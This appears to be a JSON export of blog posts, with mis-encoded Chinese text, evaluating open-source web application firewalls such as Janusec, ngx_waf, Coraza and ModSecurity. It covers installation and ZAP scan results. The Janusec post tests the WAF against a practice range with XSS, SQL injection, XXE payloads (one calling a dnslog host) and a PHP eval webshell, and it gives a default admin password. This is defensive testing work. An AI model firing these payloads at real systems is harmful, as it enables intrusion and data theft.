janusec\næµ‹è¯•å®‰è£…æ‰“å¼€æµè§ˆå™¨ï¼ˆæ¯”å¦‚Chromeï¼‰,ä½¿ç”¨å¦‚ä¸‹åœ°å€ï¼š\nåœ¨config.jsonä¸­ï¼Œå¦‚æœ â€œprimary_nodeâ€ - â€œadminâ€ - â€œlistenâ€ ä¸ºfalseï¼Œåˆ™ç®¡ç†å…¥å£ä¸ºï¼š\n\n\n\n\n\n\n\n\n\nhttp:&#x2F;&#x2F;æ‚¨çš„ç½‘å…³IPåœ°å€&#x2F;janusec-admin&#x2F; ï¼Œ è¿™æ˜¯Janusecåº”ç”¨ç½‘å…³çš„ç¬¬ä¸€ä¸ªç®¡ç†åœ°å€https:&#x2F;&#x2F;æ‚¨çš„ä»»æ„åº”ç”¨åŸŸå&#x2F;janusec-admin&#x2F; (åœ¨é…ç½®è¯ä¹¦å’Œåº”ç”¨ä¹‹åå¯ä»¥ä½¿ç”¨)\nå¦‚æœ â€œprimary_nodeâ€ - â€œadminâ€ - â€œlistenâ€ ä¸ºtrueï¼Œåˆ™é»˜è®¤ç®¡ç†å…¥å£ä¸ºï¼š\n\n\n\n\n\n\n\n\n\nhttp:&#x2F;&#x2F;æ‚¨çš„ç½‘å…³IPåœ°å€:9080&#x2F;janusec-admin&#x2F; ï¼Œ è¿™æ˜¯Janusecåº”ç”¨ç½‘å…³çš„ç¬¬ä¸€ä¸ªç®¡ç†åœ°å€https:&#x2F;&#x2F;æ‚¨çš„ä»»æ„åº”ç”¨åŸŸå:9443&#x2F;janusec-admin&#x2F; (åœ¨é…ç½®è¯ä¹¦å’Œåº”ç”¨ä¹‹åå¯ä»¥ä½¿ç”¨)\né»˜è®¤ç”¨æˆ·åï¼šadminé»˜è®¤å£ä»¤ï¼šJ@nusec123\né«˜å¯ç”¨éƒ¨ç½²é™„å½•3: é«˜å¯ç”¨é…ç½®\nä½¿ç”¨&amp;æµ‹è¯•åº”ç”¨é…ç½®ä½¿ç”¨pikachué¶åœºä½œä¸ºåç«¯æœåŠ¡è¿›è¡Œæµ‹è¯•\næµ‹è¯•1.ç›®å½•æ‰«æä½¿ç”¨OWASP DirBuster 0.12 è¿›è¡Œç›®å½•æš´åŠ›ç ´è§£ï¼ŒJanusecæœªæ‹¦æˆªï¼Œdashboardä¸ºæ˜¾ç¤ºæ¼æ´æ”»å‡»å‘Šè­¦\n2.XSSæ³¨å…¥-æ‰‹åŠ¨æµ‹è¯•åå°„å‹XSS-get\nå‡ºå…¥æ¡†ä¸­æµ‹è¯•&lt;&gt;JordanéªŒè¯æ˜¯&lt;&gt;æ˜¯å¦ä¼šè¢«è¿‡æ»¤æ‰å¦‚å›¾å³ä½¿ç»è¿‡WAFï¼Œè¾“å…¥çš„æŸ¥è¯¢å†…å®¹ä¾ç„¶åŸå°ä¸åŠ¨çš„è¾“å‡ºåˆ°æ ‡ç­¾ä¸­ï¼Œå¯ä»¥ä¸€è¿›æ­¥æµ‹è¯•ã€‚æµ‹è¯•JSä»£ç &lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;\næ³¨æ„ï¼šå‰ç«¯å¯¹è¾“å…¥é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œéœ€è¦ä¿®æ”¹å‰ç«¯æ ‡ç­¾çš„é•¿åº¦é™åˆ¶è¿›è¡Œç»•è¿‡ç»•è¿‡WAFç›´æ¥è¯·æ±‚åç«¯æœåŠ¡ç»è¿‡WAFè¯·æ±‚ç»“æœå‘½ä¸­Policy ID 10114 Basic XSS Tagsç­–ç•¥\n\nPolicy ID 10115 Basic XSS Functions**Policy ID 10116 Basic XSS Event **\nå­˜å‚¨å‹xssğŸ’€æµè§ˆç‰ˆè¾“å…¥&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;æˆåŠŸå¼¹çª—ï¼ŒWAFå¤±æ•ˆ\nCCé˜²æŠ¤æµ‹è¯•å­˜å‚¨å‹XSSï¼Œåå¤åˆ é™¤ç•™è¨€æ¿æ—¶å‡ºå‘CCé˜²æŠ¤ç­–ç•¥\n3.SQLæ³¨å…¥-æ‰‹å·¥å­—ç¬¦å‹æ³¨å…¥-getè¾“å…¥kobe&#39; or 1=1#ç»è¿‡WAF å‘½ä¸­ Policy ID: 10106\næœç´¢å‹æ³¨å…¥è¾“å…¥k%&#39; or 1=1#ç»è¿‡WAFå‘½ä¸­Policy ID: 10102\nXXå‹æ³¨å…¥è¾“å…¥kobe&#39;) or 1=1#ç»è¿‡WAFå‘½ä¸­Policy ID: 10106\n4.RCEè¾“å…¥phpinfo();ç»è¿‡WAFå‘½ä¸­webshell Policy ID: 10112\n5.XXEğŸ’€è¾“å…¥palyload,ç»è¿‡WAFä¸ºè¢«é˜»æ–­ï¼Œå¤±è´¥\n&lt;?xml version &#x3D; &quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [     &lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt; ]&gt; &lt;x&gt;&amp;f;&lt;&#x2F;x&gt;\n\nXXEå¸¦å¤–æµ‹è¯•å¤±è´¥ğŸ’€è¾“å…¥\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;a5kps8.dnslog.cn&quot; &gt;\n]&gt;\n&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;\n\n6.æ–‡ä»¶ä¸Šä¼ -webshellå®¢æˆ·ç«¯checkç»•è¿‡å‰ç«¯é™åˆ¶ï¼Œåˆ é™¤onchange=&quot;checkFileExt(this.value)&quot;ä¸Šä¼ PHP webshellæˆåŠŸ\n&lt;?php\neval($_POST[&quot;pass&quot;]);\nç»è¿‡WAFè¢«banner\n7.OWASP Top 10ä½¿ç”¨OWASP ZAP 2.11.1æµ‹è¯•** æµ‹è¯•é¡¹åŠç»“æœ**\n\n\n\n\nå¼ºåº¦\nè¿›å±•\nElapsed\nReqs\nè­¦æŠ¥\nçŠ¶æ€\n\n\n\nåˆ†æä»ª\n\n\n00:00.216\n36\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlugin\n\n\n\n\n\n\n\n\nPath Traversal\nä¸­ç­‰çš„\n100\n09:38.184\n159\n0\nå®Œæˆ\n\n\nè¿œç¨‹æ–‡ä»¶åŒ…å«\nä¸­ç­‰çš„\n100\n08:49.120\n80\n0\nå®Œæˆ\n\n\nSource Code Disclosure - &#x2F;WEB-INF folder\nä¸­ç­‰çš„\n100\n00:01.608\n7\n0\nå®Œæˆ\n\n\nExternal Redirect\nä¸­ç­‰çš„\n100\n18:48.339\n172\n1\nå®Œæˆ\n\n\nServer Side Include\nä¸­ç­‰çš„\n100\n08:39.117\n102\n0\nå®Œæˆ\n\n\nCross Site Scripting (Reflected)\nä¸­ç­‰çš„\n100\n04:19.813\n137\n0\nå®Œæˆ\n\n\nCross Site Scripting (Persistent) - Prime\nä¸­ç­‰çš„\n100\n01:19.335\n29\n0\nå®Œæˆ\n\n\nCross Site Scripting (Persistent) - Spider\nä¸­ç­‰çš„\n100\n02:04.693\n184\n0\nå®Œæˆ\n\n\nCross Site Scripting (Persistent)\nä¸­ç­‰çš„\n100\n00:30.836\n0\n0\nå®Œæˆ\n\n\nSQL Injection\nä¸­ç­‰çš„\n100\n09:39.681\n97\n0\nå®Œæˆ\n\n\nServer Side Code Injection\nä¸­ç­‰çš„\n100\n04:33.695\n74\n1\nå®Œæˆ\n\n\nRemote OS Command Injection\nä¸­ç­‰çš„\n100\n15:10.048\n147\n1\nå®Œæˆ\n\n\nDirectory Browsing\nä¸­ç­‰çš„\n100\n02:02.420\n185\n32\nå®Œæˆ\n\n\nç¼“å†²åŒºæº¢å‡º\nä¸­ç­‰çš„\n100\n00:19.764\n31\n0\nå®Œæˆ\n\n\næ ¼å¼å­—ç¬¦ä¸²é”™è¯¯\nä¸­ç­‰çš„\n100\n03:33.630\n65\n0\nå®Œæˆ\n\n\nCRLF Injection\nä¸­ç­‰çš„\n100\n17:50.856\n169\n0\nå®Œæˆ\n\n\nParameter Tampering\nä¸­ç­‰çš„\n100\n09:14.914\n74\n0\nå®Œæˆ\n\n\nELMAHä¿¡æ¯æ³„æ¼\nä¸­ç­‰çš„\n100\n00:20.010\n0\n0\nå®Œæˆ\n\n\n.htaccess Information Leak\nä¸­ç­‰çš„\n100\n00:34.186\n35\n0\nå®Œæˆ\n\n\nScript Active Scan Rules\nä¸­ç­‰çš„\n100\n00:00.000\n0\n0\nè·³è¿‡ï¼Œæœªå¯ç”¨ä»»ä½•è„šæœ¬\n\n\nè·¨ç«™ç‚¹è„šæœ¬ï¼ˆåŸºäºDOMï¼‰\nä¸­ç­‰çš„\n100\n00:05.864\n0\n0\nè·³è¿‡ï¼Œå¯åŠ¨æˆ–è¿æ¥æµè§ˆå™¨å¤±è´¥\n\n\nSOAP Action Spoofing\nä¸­ç­‰çš„\n100\n00:00.503\n0\n0\nå®Œæˆ\n\n\nSOAP XML Injection\nä¸­ç­‰çš„\n100\n00:19.623\n0\n0\nå®Œæˆ\n\n\n\n\n\n\n\n\n\n\n\næ€»è®¡\n\n\n117:34.853\n2298\n35\n\n\n\nWAF dashboardæ˜¾ç¤ºç»“æœ\n","slug":"å¼€æºWAFé€‰å‹-Janusec","date":"2022-06-08T05:58:01.418Z","categories_index":"å¼€æºWAFäº§å“é€‰å‹","tags_index":"WAF,Nginx,å¼€æºWAFäº§å“é€‰å‹,å®‰å…¨å»ºè®¾,Kongç½‘å…³","author_index":"Moses"},{"id":"63a5a11a14a315d8cefd93c2d8cf4b9d","title":"å¼€æºWAFè°ƒç ”ä¹‹äº§å“é€‰å‹-Coraza","content":"äº§å“ä¿¡æ¯ç®€ä»‹\n\n\nåç§°\nå¼€æºåè®®\nå¼€å‘è¯­è¨€\nå¼€æºæ—¶é—´\næ´»è·ƒåº¦\nä»£ç è´¨é‡\næœ€æ–°ç‰ˆæœ¬\nå‚å•†\n\n\n\ncoraza\nOpen-source Apache 2 Licensed\ngo\n2021-09-02ï¼ˆ1.0.0ï¼‰\n518â­ï¸\nA\n2022-03-31 ï¼ˆ2.0.0ï¼‰\nOWASP\n\n\næ•°æ®å±•ç¤º-Grafana\n","slug":"å¼€æºWAFé€‰å‹-coraza","date":"2022-06-07T08:43:50.255Z","categories_index":"å¼€æºWAFäº§å“é€‰å‹","tags_index":"WAF,Nginx,å¼€æºWAFäº§å“é€‰å‹,modsecurity,å®‰å…¨å»ºè®¾","author_index":"Moses"},{"id":"d83ed4274a56feb5fee348cbe5357a10","title":"å¼€æºWAFè°ƒç ”ä¹‹äº§å“é€‰å‹-Ngx_Waf","content":"äº§å“ä¿¡æ¯ç®€ä»‹\n\n\nåç§°\nå¼€æºåè®®\nå¼€å‘è¯­è¨€\nå¼€æºæ—¶é—´\næ´»è·ƒåº¦\nä»£ç è´¨é‡\næœ€æ–°ç‰ˆæœ¬\nå‚å•†\n\n\n\nngx_waf\nBSD 3-Clause License\nC\n2020-08-18ï¼ˆ1.0.0ï¼‰\n983â­ï¸\nA\n2022-01-07 ï¼ˆ6.1.8ï¼‰\nä¸ªäººå¼€å‘è€…\n\n\näº§å“æè¿°æ–¹ä¾¿ã€é«˜æ€§èƒ½ã€å…¼å®¹ ModSecurity çš„ Nginx é˜²ç«å¢™æ¨¡å—.å®ç°åŸºç¡€çš„é˜²æŠ¤ï¼Œå³ IP æ£€æµ‹ã€Url æ£€æµ‹ã€Get å‚æ•°æ£€æµ‹ã€Cookie æ£€æµ‹ã€Post æ£€æµ‹ã€Referer æ£€æµ‹å’Œ CC é˜²å¾¡.å…·ä½“å‚è€ƒå¼€å‘è€…blognginx é˜²ç«å¢™æ¨¡å—å¼€å‘æ€»ç»“\nå®‰è£…å…¼å®¹æ€§è¯´æ˜\næ“ä½œç³»ç»Ÿï¼šLinux\nNginxå…¼å®¹ï¼šæœ¬æ¨¡å—åªä¿è¯å¯¹Â nginx-1.18.0Â æˆ–æ›´æ–°çš„ç‰ˆæœ¬çš„å…¼å®¹æ€§ã€‚\næ¨¡å—å…¼å®¹æ€§é—®é¢˜ï¼šæœ¬æ¨¡å—ä¸Â ngx_http_rewrite_moduleÂ (opens new window)å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ã€‚\n\né™æ€æ¨¡å—\n\n\n\n\n\n\n\n\næ³¨æ„ç¼–è¯‘å®‰è£…æ¨¡å—å¯èƒ½éœ€è¦ä¸€äº›ä¾èµ–ï¼Œæ¯”å¦‚ gccï¼Œè¯·è‡ªè¡Œè§£å†³ä¾èµ–é—®é¢˜ï¼Œæœ¬æ–‡ä¸æä¾›è¿™ç±»ä¿¡æ¯ã€‚\né‡è¦ä¿¡æ¯\n\n\n\n\n\n\n\n\n\nç¼–è¯‘å®‰è£…ä¸€ä¸ªæ–°çš„æ¨¡å—éœ€è¦çŸ¥é“å½“å‰çš„ nginx çš„Â configureÂ è„šæœ¬çš„å‚æ•°ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¿è¡ŒÂ nginx -VÂ æ¥è·å–ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\nnginx version: nginx&#x2F;1.19.6\nbuilt by gcc 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)\nbuilt with OpenSSL 1.1.1i  8 Dec 2020\nTLS SNI support enabled\nconfigure arguments: --with-mail&#x3D;dynamic --with-openssl&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;openssl-OpenSSL_1_1_1i --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --user&#x3D;nginx --group&#x3D;nginx --with-file-aio --with-http_ssl_module --with-http_geoip_module --with-http_v2_module --with-http_realip_module --with-stream_ssl_preread_module --with-http_addition_module --with-http_xslt_module&#x3D;dynamic --with-http_image_filter_module&#x3D;dynamic --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_random_index_module --with-http_secure_link_module --with-http_degradation_module --with-http_slice_module --with-http_perl_module --with-http_stub_status_module --with-http_auth_request_module --with-mail&#x3D;dynamic --with-mail_ssl_module --with-pcre --with-pcre-jit --with-stream&#x3D;dynamic --with-stream_ssl_module --with-debug --with-cc-opt&#x3D;&#39;-O3 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE&#x3D;2 -fexceptions -fstack-protector-strong --param&#x3D;ssp-buffer-size&#x3D;4 -grecord-gcc-switches -m64 -mtune&#x3D;generic&#39;\n\nåŠ¡å¿…è®°ä½Â configure arguments:Â åé¢çš„å†…å®¹ï¼Œä¸‹æ–‡ä¸­å°†ä½¿ç”¨Â ARGÂ æ¥ä»£æ›¿è¿™å—å†…å®¹ã€‚\n\né¦–å…ˆä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„ nginxï¼Œä¸‹è½½é¡µé¢Â (opens new window)ã€‚ ä¸‹é¢å°†ä»¥Â nginx-1.20.1Â ä¸ºä¾‹ã€‚cd &#x2F;usr&#x2F;local&#x2F;src\nwget https:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.20.1.tar.gz\ntar -zxf nginx-1.20.1.tar.gz\nç„¶åä¸‹è½½æœ¬æ¨¡å—çš„æºç ï¼Œä¸‹æ–‡å°†ä½¿ç”¨ç¨³å®šç‰ˆçš„æºç ã€‚cd &#x2F;usr&#x2F;local&#x2F;src\ngit clone -b lts https:&#x2F;&#x2F;github.com&#x2F;ADD-SP&#x2F;ngx_waf.git\næ¥ä¸‹æ¥åº”è¯¥è¿è¡Œé…ç½®è„šæœ¬ã€‚cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;nginx-1.20.1\n.&#x2F;configure ARG --add-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_waf\nsed -i &#39;s&#x2F;^\\(CFLAGS.*\\)&#x2F;\\1 -fstack-protector-strong -Wno-sign-compare&#x2F;&#39; objs&#x2F;Makefile\nå¼€å§‹ç¼–è¯‘# ä¸ä½¿ç”¨å¹¶è¡Œç¼–è¯‘\nmake\n\n# ä½¿ç”¨å¹¶è¡Œç¼–è¯‘\nmake -j$(nproc)\nå…³é—­ nginxï¼Œç„¶åæ›¿æ¢ nginx çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œ æ­¤å¤„å‡è®¾ nginx çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ä¸ºÂ /usr/local/nginx/sbin/nginxã€‚cp objs&#x2F;nginx &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx\n\n\n\n\n\n\n\n\n\nçƒ­éƒ¨ç½²å¦‚æœæ‚¨ä¸æƒ³åœ¨æ›¿æ¢äºŒè¿›åˆ¶æ–‡ä»¶æ—¶å…³é—­ nginxï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£çš„çƒ­éƒ¨ç½²æ–¹æ¡ˆÂ (opens new window)ã€‚\n\n\nåŠ¨æ€æ¨¡å—ä¸‹è½½é¢„æ„å»ºçš„æ¨¡å—æ‚¨å¯ä»¥é€šè¿‡æ‰§è¡Œè„šæœ¬Â assets/download.shÂ æ¥ä¸‹è½½åŠ¨æ€æ¨¡å—ã€‚ä¸‹é¢æ˜¯ä¸€äº›ç”¨ä¾‹ã€‚\n# ç”¨äº nginx-1.20.1 çš„ LTS ç‰ˆçš„æ¨¡å—\nsh assets&#x2F;download.sh 1.20.1 lts\n\n# ç”¨äº nginx-1.21.1 çš„ LTS ç‰ˆçš„æ¨¡å—\nsh assets&#x2F;download.sh 1.21.1 lts\n\n# ç”¨äº nginx-1.20.1 çš„æœ€æ–°ç‰ˆçš„æ¨¡å—\nsh assets&#x2F;download.sh 1.20.1 current\n\n# ç”¨äº nginx-1.21.1 çš„æœ€æ–°ç‰ˆçš„æ¨¡å—\nsh assets&#x2F;download.sh 1.21.1 current\n\næ‰§è¡Œè„šæœ¬åä½ ä¼šçœ‹åˆ°ç±»ä¼¼ä¸‹é¢è¿™æ ·çš„è¾“å‡ºã€‚\nchecking for command ... yes\nchecking for libc implementation ... yes\n + GNU C libary\nPulling remote image addsp&#x2F;ngx_waf-prebuild:ngx-1.21.1-module-beta-glibc\n......\n......\n......\nDownload complete!\n\nå¦‚æœä½ çœ‹åˆ°Â Download complete!Â åˆ™è¯´æ˜ä¸‹è½½æˆåŠŸï¼Œæ¨¡å—ä¼šè¢«ä¿å­˜åœ¨å½“å‰ç›®å½•ä¸‹ã€‚ ä½ å¯ä»¥å°†å…¶æ‹·è´åˆ°ä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶ååœ¨Â nginx.confÂ çš„é¡¶éƒ¨æ·»åŠ ä¸€è¡Œã€‚\nload_module &quot;&#x2F;path&#x2F;to&#x2F;ngx_http_waf_module.so&quot;;\n\nç„¶åå…³é—­ nginx å¹¶è¿è¡ŒÂ nginx -tã€‚å¦‚æœæ²¡æœ‰å‡ºé”™åˆ™è¯´æ˜æ¨¡å—è¢«æ­£å¸¸åŠ è½½ï¼Œåä¹‹åˆ™è¯´æ˜æ‚¨çš„ nginx ä¸æ”¯æŒé¢„æ„å»ºçš„æ¨¡å—ï¼Œè¯·ç¼–è¯‘å®‰è£…æ¨¡å—ã€‚\nç¼–è¯‘åŠ¨æ€æ¨¡å—ç¼–è¯‘å®‰è£…åŠ¨æ€æ¨¡å—å¹¶ä¸éœ€è¦é‡æ–°ç¼–è¯‘æ•´ä¸ª nginxï¼Œåªéœ€è¦é‡æ–°ç¼–è¯‘æ‰€æœ‰çš„æ¨¡å—ï¼Œæ‰€ä»¥ é€Ÿåº¦ç›¸å¯¹é™æ€æ¨¡å—å¿«ä¸€äº›ï¼Œè¿™ä¹Ÿæ˜¯æœ¬æ–‡æ¡£æ¨èçš„æ–¹å¼ã€‚\nä¸‹è½½ nginx æºç å’Œæ¨¡å—æºç çš„è¿‡ç¨‹åŒé™æ€æ¨¡å—ï¼Œä¸å†èµ˜è¿°ã€‚\nè¿è¡Œé…ç½®è„šæœ¬\n.&#x2F;configure --add-dynamic-module&#x3D;&#x2F;usr&#x2F;local&#x2F;src&#x2F;ngx_waf --with-compat\nsed -i &#39;s&#x2F;^\\(CFLAGS.*\\)&#x2F;\\1 -fstack-protector-strong -Wno-sign-compare&#x2F;&#39; objs&#x2F;Makefile\n\nç„¶åå¼€å§‹ç¼–è¯‘åŠ¨æ€æ¨¡å—\nmake modules\n\næ¥ç€æ‚¨åº”è¯¥å…³é—­ nginxï¼Œç„¶åå°†åŠ¨æ€æ¨¡å—æ‹·è´åˆ°æ¨¡å—ç›®å½•ï¼Œ æ­¤å¤„å‡è®¾æ¨¡å—ç›®å½•çš„ç»å¯¹è·¯å¾„ä¸ºÂ /usr/local/nginx/modulesã€‚\ncp objs&#x2F;*.so &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules\n\næœ€ååœ¨ nginx çš„é…ç½®æ–‡ä»¶é¡¶éƒ¨æ·»åŠ ä¸€è¡Œ\nload_module &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules&#x2F;ngx_http_waf_module.so&quot;;\n\n\ncd &#x2F;usr&#x2F;local&#x2F;src \\\n        &amp;&amp;  wget https:&#x2F;&#x2F;github.com&#x2F;maxmind&#x2F;libmaxminddb&#x2F;releases&#x2F;download&#x2F;1.6.0&#x2F;libmaxminddb-1.6.0.tar.gz -O libmaxminddb.tar.gz         &amp;&amp;  mkdir libmaxminddb \\\n        &amp;&amp;  tar -zxf &quot;libmaxminddb.tar.gz&quot; -C libmaxminddb --strip-components&#x3D;1 \\\n        &amp;&amp;  cd libmaxminddb \\\n        &amp;&amp;  .&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;libmaxminddb \\\n        &amp;&amp;  make -j $(nproc) \\\n        &amp;&amp;  make install \\\n        &amp;&amp;  cd &#x2F;usr&#x2F;local&#x2F;src \\\n        &amp;&amp;  git clone -b v3.0.5 https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity.git \\\n        &amp;&amp;  cd ModSecurity \\\n        &amp;&amp;  chmod +x build.sh \\\n        &amp;&amp;  .&#x2F;build.sh \\\n        &amp;&amp;  git submodule init \\\n        &amp;&amp;  git submodule update \\\n        &amp;&amp;  .&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;modsecurity --with-maxmind&#x3D;&#x2F;usr&#x2F;local&#x2F;libmaxminddb \\        \n\t\t&amp;&amp;  make -j $(nproc) \\ \\\n        &amp;&amp;  make install \\\n        &amp;&amp;  export LIB_MODSECURITY&#x3D;&#x2F;usr&#x2F;local&#x2F;modsecurity \\\n        &amp;&amp;  cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;nginx-1.22.0\n\n\nModSecurity - v3.0.5 for Linux\n\n Mandatory dependencies\n   + libInjection                                  ....v3.9.2-46-gbfba51f\n   + SecLang tests                                 ....a3d4405\n\n Optional dependencies\n   + GeoIP&#x2F;MaxMind                                 ....found\n      * (MaxMind) v\n         &#x2F;usr&#x2F;local&#x2F;libmaxminddb&#x2F;lib&#x2F;&#x2F;libmaxminddb.so, &#x2F;usr&#x2F;local&#x2F;libmaxminddb&#x2F;include, -DWITH_MAXMIND -I&#x2F;usr&#x2F;local&#x2F;libmaxminddb&#x2F;include\n   + LibCURL                                       ....not found\n   + YAJL                                          ....not found\n   + LMDB                                          ....not found\n   + LibXML2                                       ....not found\n   + SSDEEP                                        ....not found\n   + LUA                                           ....not found\n\n Other Options\n   + Test Utilities                                ....disabled\n   + SecDebugLog                                   ....enabled\n   + afl fuzzer                                    ....disabled\n   + library examples                              ....enabled\n   + Building parser                               ....disabled\n   + Treating pm operations as critical section    ....disabled\n\n\nå¤‡æ³¨\n\næµ‹è¯•æœåŠ¡å™¨é›†ç¾¤éƒ½å®‰è£…äº†NginxæœåŠ¡ï¼Œéœ€è¦ä½¿ç”¨è™šæ‹Ÿæœºæ­å»º\nå®‰è£…Nginxå‚ç…§Nginx1.22.0å®‰è£…\nè‡ªç ”WAFä¹‹è·¯â€”â€”Modsecurityå®‰è£…æ•™ç¨‹ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\nModSecurityåœæ­¢ç»´æŠ¤\n\nå‚è€ƒModSecurityä¸­æ–‡ç¤¾åŒºè‡ªç ”WAFä¹‹è·¯â€”â€”Modsecurityå®‰è£…æ•™ç¨‹ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\n","slug":"å¼€æºWAFé€‰å‹-Ngx_waf","date":"2022-06-07T02:48:17.348Z","categories_index":"å¼€æºWAFäº§å“é€‰å‹","tags_index":"WAF,Nginx,å¼€æºWAFäº§å“é€‰å‹,å®‰å…¨å»ºè®¾","author_index":"Moses"},{"id":"cbb2976f11ff7fb8777c04992cf59470","title":"å¼€æºWAFè°ƒç ”ä¹‹äº§å“é€‰å‹","content":"æ‹†è§£è¯¾é¢˜å¼€æºWAFäº§å“è°ƒç ”\næœ¬å‘¨å®Œæˆï¼Œç”„é€‰3-5æ¬¾å¼€æºWAFäº§å“ï¼Œå¹¶è¾“å‡ºè°ƒç ”æŠ¥å‘Š\n1-2å‘¨å®Œæˆæµ‹è¯•ç¯å¢ƒæ­å»º\n\né€‰å“é€‰å‹è¯„ä¼°&#x3D;&gt; è¯„ä¼°æŠ¥å‘Šä¸­åº”åŒ…å«å¼€æºWAFçš„åŠŸèƒ½ã€ç¨³å®šæ€§ã€æ‰©å±•æ€§è¯„ä¼°ã€‚&#x3D;&gt; è¯„ä¼°æŠ¥å‘Šåº”åŒ…å«å…³é”®åŠŸèƒ½ã€æ€§èƒ½æŒ‡æ ‡çš„æ¯”è¾ƒ\néœ€æ±‚åˆ†æ1.ç¦æ­¢å›½å¤–IPè®¿é—®\n\n\n\n\n\n\n\n\nä¸å­˜åœ¨å›½å¤–ä¸šåŠ¡ï¼ŒåŸæœ‰é˜¿é‡Œäº‘ç¦æ­¢å›½å¤–IPè®¿é—®æ‰€æœ‰ä¸šåŠ¡ç³»ç»Ÿã€‚\n\n å¯¹ç­–ï¼šä½¿ç”¨Nginx çš„ ngx_http_geoip2  å‚è€ƒhttps://mp.weixin.qq.com/s/H_eOPAUUytH_FPsxz3OC7g\n éš¾ç‚¹ï¼šIPåœ°å€åº“çš„å®šæœŸæ›´æ–°ç»´æŠ¤\n\n2.IPé»‘ç™½åå•\n å¯¹ç­–ï¼šå‚è€ƒä½¿ç”¨ipblocks\n éš¾ç‚¹ï¼šåŒä¸Š\n\n3.OWASP Top10 æ¼æ´æ£€æµ‹é˜²å¾¡\n å‡†å¤‡ï¼šé¶åœºç¯å¢ƒã€æµ‹è¯•å·¥å…·ã€æ‰‹åŠ¨éªŒè¯\n å¯¹ç­–ï¼šä½¿ç”¨ModSecurity +owasp-modsecurity-crs\n éš¾ç‚¹ï¼šé˜²æŠ¤èƒ½åŠ›å¾…éªŒè¯ï¼ŒCRSæœ€è¿‘ç‰ˆæœ¬æ˜¯2019å¹´ç‰ˆ\n\n4.Bot5.CC6.dashboard\n å¯¹ç­–ï¼šNginx Ngx_waf å‡æ²¡æœ‰dashboard Janusecæœ‰\n éš¾ç‚¹ï¼šè‡ªå»ºå‰ç«¯æŠ€æœ¯æŒ‘æˆ˜è¾ƒå¤§\n\n7.WAFè‡ªå®šä¹‰è§„åˆ™\n å¯¹ç­–:Ngx_waf ModSecurityå‡æ”¯æŒé…ç½®è¯­æ³•ï¼›Janusecæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼\n éš¾ç‚¹ï¼šModSecurity è¯­æ³•ModSecurityä¸­æ–‡æ‰‹å†Œä¸æ­£åˆ™è¡¨è¾¾å¼å‡å­˜åœ¨å­¦ä¹ æˆæœ¬ Google RE2 æ­£åˆ™è¡¨è¾¾å¼\n\näº§å“è°ƒç ”ä¸€ã€ngx_wafngx_waf\n\n Ngx_WAFé€‰å‹å¯ç ”æŠ¥å‘Š âœ… 2022-06-10[[å¼€æºWAFé€‰å‹-Ngx_waf]]\n\näºŒã€janusecå®‰å…¨å¼€æº - JANUSEC-æ•°æ®å®‰å…¨ä¸éšç§ä¿æŠ¤\n\n Janusecé€‰å‹å¯ç ”æŠ¥å‘Š âœ… 2022-06-10[[å¼€æºWAFé€‰å‹-Janusec]]\n\nä¸‰ã€CorazaOWASP Coraza WAF - Enterprise-grade open source web application firewall library\n\n Corazaé€‰å‹å¯ç ”æŠ¥å‘Š\n\n[[å¼€æºWAFé€‰å‹-coraza]]\nå››ã€api-firewallAPI Firewall overview - Wallarm Documentation\näº”ã€Awesome-WAFAwesome Search\nå…­ã€WallarmWAF for Kubernetes | API Security for K8s â˜ï¸ | Wallarmæ˜¯é¢å‘K8Sçš„APIå®‰å…¨ç½‘å…³å’Œä¸‹ä¸€ä»£WAFï¼Œç›®å‰åŸºäºæä¾›SAASæœåŠ¡ï¼Œå…è´¹è¯•ç”¨14å¤©ã€‚æ³¨å†Œåœ°å€æœåŠ¡å™¨å†EUå’ŒUSï¼Œé¢ä¸´è´¹ç”¨å’Œç½‘ç»œçš„åŒé‡é—®é¢˜æš‚æ—¶ä¸è€ƒè™‘ã€‚doc\nä¸ƒã€ModSecurityModSecurity \n\n ModSecurityé€‰å‹å¯ç ”æŠ¥å‘Š âœ… 2022-06-10\n\n[[å¼€æºWAFé€‰å‹-Nginx+ModSecurity3.0]]\näº§å“é€‰å‹WAFäº§å“åˆ—è¡¨-from whatwaf360 Web Application Firewall (360)\naeSecure (WAF)\nAirlock 